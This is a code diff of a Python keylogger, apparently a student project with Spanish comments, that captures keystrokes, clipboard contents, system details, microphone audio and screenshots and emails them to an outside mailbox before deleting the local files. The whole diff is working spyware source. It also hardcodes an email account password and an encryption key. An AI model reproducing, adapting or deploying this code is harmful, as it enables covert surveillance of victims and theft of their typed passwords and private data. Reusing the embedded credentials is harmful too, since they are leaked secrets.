@@ -1,50 +1,39 @@
-# Libraries
+#Elaborado por Daniela Amu con ayuda de Andrés Arrieta 
+
 import os
 import socket
 import platform
-import getpass
 import time
 import smtplib
 import sounddevice as sd
 from PIL import ImageGrab
-from requests import get
+from pynput.keyboard import Key, Listener
+from scipy.io.wavfile import write
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from multiprocessing import Process, freeze_support
-from pynput.keyboard import Key, Listener
-from scipy.io.wavfile import write
 from cryptography.fernet import Fernet
 import win32clipboard
+from multiprocessing import Process, freeze_support
+import threading
+from requests import get
 
-# Global Variables
+# Variables de entorno
+file_path = "C:\\Users\\danie\\Desktop\\KEYLOGGER\\Project"
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
-time_interval = 20
-number_of_screenshots = 3
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
-print("System initialize" + str(time.time()))
-
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
-
 email_address = "userattch2023@outlook.com"
 password = "yihkwprettuxwxgw"
-username = getpass.getuser()
 toaddr = "user.attch@gmail.com"
 key = "s-bIgdAv5W40sFub7iBRCrk9JDEsyXZmJ3DRc2ND6Ok="
+time_interval = 20  
+number_of_screenshots = 3
 
-file_path = "C:\\Users\\danie\\Desktop\\KEYLOGGER\\Project"
-extend = "\\"
-file_merge = file_path + extend
-with open(file_path + extend + keys_information, "w") as f:
-    f.write(" ")
-
-# Email Functionality
+# Funcionalidad de enviar email
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
     msg = MIMEMultipart()
@@ -69,9 +58,9 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
-# Computer Information
+# Captura de información del ordenador
 def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
+    with open(file_path + "\\" + system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
@@ -85,9 +74,9 @@ def computer_information():
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address " + IPAddr + '\n')
 
-# Clipboard Information
+# Captura portapapeles
 def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
+    with open(file_path + "\\" + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -96,77 +85,66 @@ def copy_clipboard():
         except:
             f.write("Clipboard could not be copied")
 
-# Microphone
+# Captura micrófono 
 def microphone():
     fs = 44100
     myrecording = sd.rec(int(time_interval * fs), samplerate=fs, channels=2)
     sd.wait()
-    write(file_path + extend + audio_information, fs, myrecording)
+    write(file_path + "\\" + audio_information, fs, myrecording)
 
-# Screenshot
+# Captura de pantalla
 def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
+    for i in range(number_of_screenshots):
+        time.sleep(time_interval / number_of_screenshots)
+        im = ImageGrab.grab()
+        im.save(file_path + "\\" + screenshot_information)
+        send_email(screenshot_information, file_path + "\\" + screenshot_information, toaddr)
+        os.remove(file_path + "\\" + screenshot_information)
 
-# Keylogger Functions
-keys = []
-count = 0
+
+# Keylogger
+def write_to_file(key):
+    with open(file_path + "\\" + keys_information, "a") as f:
+        try:
+            k = key.char  
+        except AttributeError:
+            k = str(key)
+            if key == Key.space:
+                k = " " 
+            elif key == Key.enter:
+                k = "\n"
+            elif key == key.ctrl:
+                k = "ctrl"
+            elif key == key.backspace:
+                k = ""
+        f.write(k)
+
 def on_press(key):
-    global keys, count, currentTime
-    keys.append(key)
-    count += 1
-    currentTime = time.time()
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-
-def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
-
-def on_release(key):
     if key == Key.esc:
+        # Detener el keylogger cuando se presiona "esc"
         return False
-    if currentTime > stoppingTime:
-        return False
+    write_to_file(key)
 
-# Timer for Keylogger
-number_of_iterations = 0
-currentTime = time.time()
-screenshot_time = time_interval / number_of_screenshots
-stoppingTime = time.time() + time_interval
+# Iniciar los procesos
+with Listener(on_press=on_press) as listener:
+    # Funcionalidad en hilos
+    threading.Thread(target=computer_information).start()
+    threading.Thread(target=copy_clipboard).start()
+    threading.Thread(target=microphone).start()
+    threading.Thread(target=screenshot).start()
 
-while number_of_iterations < number_of_screenshots:
+    time.sleep(time_interval)
+    # Detener el keylogger
+    listener.stop()
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-        
-    microphone()
+# Enviar email con los datos obtenidos
+send_email(keys_information, file_path + "\\" + keys_information, toaddr)
+send_email(system_information, file_path + "\\" + system_information, toaddr)
+send_email(clipboard_information, file_path + "\\" + clipboard_information, toaddr)
+send_email(audio_information, file_path + "\\" + audio_information, toaddr)
 
-    if currentTime > stoppingTime:
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
 
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-
-        number_of_iterations += 1
-        currentTime = time.time()
-        stoppingTime = time.time() + screenshot_time
-
-#time.sleep(30)
-send_email(audio_information, file_path + extend + audio_information, toaddr)
-send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
-send_email("key_log.txt", file_path + extend + keys_information, toaddr)
-# Clean up and delete files
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-
+# Limpiar 
+delete_files = [keys_information, system_information, clipboard_information, audio_information]
 for file in delete_files:
-    os.remove(file_merge + file)
+    os.remove(file_path + "\\" + file)
